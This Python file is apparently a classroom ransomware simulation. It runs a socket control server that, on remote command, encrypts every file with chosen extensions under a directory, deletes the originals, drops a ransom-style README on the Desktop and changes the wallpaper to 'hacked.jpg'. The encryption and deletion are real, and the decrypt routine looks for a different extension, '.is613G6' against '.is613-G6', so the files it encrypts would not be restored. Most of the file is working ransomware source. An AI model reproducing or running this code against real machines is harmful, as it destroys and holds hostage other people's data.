import socket
import threading
import json
import logging
from colorama import init, Fore, Style
import os
import subprocess

from cryptography.fernet import Fernet

init(autoreset=True)


def encrypt_file(key, file_path):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        original = file.read()
    encrypted = fernet.encrypt(original)

    encrypted_file_path = file_path + ".is613-G6"
    with open(encrypted_file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

    os.remove(file_path)
    return encrypted_file_path


def decrypt_file(key, file_path):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    decrypted_data = fernet.decrypt(encrypted_data)

    original_file_path = file_path.replace(".is613-G6", "")
    with open(original_file_path, 'wb') as file:
        file.write(decrypted_data)

    os.remove(file_path)


def find_and_encrypt_files(key, directory, file_extensions):
    encrypted_files = []
    for root, _, files in os.walk(directory):
        for file in files:
            if any(file.endswith(ext) for ext in file_extensions):
                file_path = os.path.join(root, file)
                encrypted_file_path = encrypt_file(key, file_path)
                encrypted_files.append(encrypted_file_path)
                print(f"Encrypted and saved file: {encrypted_file_path}")
    return encrypted_files


def find_and_decrypt_files(key, directory):
    for root, _, files in os.walk(directory):
        for file in files:
            if file.endswith(".is613G6"):
                file_path = os.path.join(root, file)
                decrypt_file(key, file_path)


class ControlServer:
    def __init__(self, host, port, log_file):
        self.host = host
        self.port = port
        self.server = None
        self.setup_logging(log_file)

    def setup_logging(self, log_file):
        logging.basicConfig(filename=log_file, level=logging.INFO,
                            format='%(asctime)s - %(levelname)s - %(message)s')

    def create_readme(self):
        desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        readme_path = os.path.join(desktop_path, 'README.txt')
        with open(readme_path, 'w') as file:
            file.write("""            
 ________                                                     __                      __ 
|        \                                                   |  \                    |  \
| $$$$$$$$ _______    _______   ______   __    __   ______  _| $$_     ______    ____| $$
| $$__    |       \  /       \ /      \ |  \  |  \ /      \|   $$ \   /      \  /      $$
| $$  \   | $$$$$$$\|  $$$$$$$|  $$$$$$\| $$  | $$|  $$$$$$\\$$$$$$  |  $$$$$$\|  $$$$$$$
| $$$$$   | $$  | $$| $$      | $$   \$$| $$  | $$| $$  | $$ | $$ __ | $$    $$| $$  | $$
| $$_____ | $$  | $$| $$_____ | $$      | $$__/ $$| $$__/ $$ | $$|  \| $$$$$$$$| $$__| $$
| $$     \| $$  | $$ \$$     \| $$       \$$    $$| $$    $$  \$$  $$ \$$     \ \$$    $$
 \$$$$$$$$ \$$   \$$  \$$$$$$$ \$$       _\$$$$$$$| $$$$$$$    \$$$$   \$$$$$$$  \$$$$$$$
                                        |  \__| $$| $$                                   
                                         \$$    $$| $$                                   
                                          \$$$$$$  \$$                                   
System Alert: Simulation Notice

This is a simulation.
Your file has been encrypted.
Do not PayNow $88 to 88888888.
Reminder: Always back up your files and stay vigilant against cyber threats.
            """)

    def handle_client(self, connection, address):
        buffer = b""  # Initialize an empty byte string for the buffer
        while True:
            data = connection.recv(1024)
            if not data:
                # No more data is being sent, break the loop
                break
            buffer += data

        try:
            message = json.loads(buffer.decode())
            response = ''
            if 'request' in message and message['request'] == 'key':
                print(f"Key request received from: {address}")
                key = input(f"{Fore.RED}Please enter the encryption key: {Style.RESET_ALL}")
                response = json.dumps({'key': key})
                logging.info(key)
            else:
                logging.info(f"Data received from {address}: {message}")
                print(f"{Fore.GREEN}Data received: {address}. {message}{Style.RESET_ALL}")

            key = message['key']
            target_directory = message['target_directory']
            file_extensions = message['file_extensions']
            match message['cmd']:
                case 'bg':
                    print(f"Background change request received from {address}")
                    image_path = "hacked.jpg"
                    try:
                        subprocess.run(["xfconf-query", "-c", "xfce4-desktop", "-p",
                                        "/backdrop/screen0/monitorVirtual-1/workspace0/last-image", "-s", image_path],
                                       check=True)
                        print('result:Background changed successfully.')
                    except subprocess.CalledProcessError as e:
                        response = json.dumps({'error': 'Failed to change background.'})
                case 'enc':
                    find_and_encrypt_files(key, target_directory, file_extensions)
                    self.create_readme()
                    response = f'Directory "{target_directory}" is encrypted using key {key} for following file extensions: {file_extensions}.'
                    print(response)
                    logging.info(response)
                case 'dec':
                    find_and_decrypt_files(key, target_directory)
                    response = f'Directory "{target_directory}" is decrypted using key {key}.'
                    print(response)
                    logging.info(response)
            connection.sendall(response.encode())
        except json.JSONDecodeError:
            logging.error("Invalid JSON data received.")
        finally:
            connection.close()

    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        logging.info(f"{Fore.YELLOW}Server listening at {self.host}:{self.port}.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Server listening at {self.host}:{self.port}{Style.RESET_ALL}")

        try:
            while True:
                connection, address = self.server.accept()
                logging.info(f"Connection established from {address}.")
                print(f"Connection established from {address}")
                client_thread = threading.Thread(target=self.handle_client, args=(connection, address))
                client_thread.start()
        except KeyboardInterrupt:
            logging.info("Shutting down the server.")
            print("Server shut down")
        finally:
            self.server.close()


if __name__ == "__main__":
    HOST = '0.0.0.0'  # Listen on all interfaces
    PORT = 12345  # Port number
    LOG_FILE = 'server_log.txt'  # Name of the log file

    control_server = ControlServer(HOST, PORT, LOG_FILE)
    control_server.start()
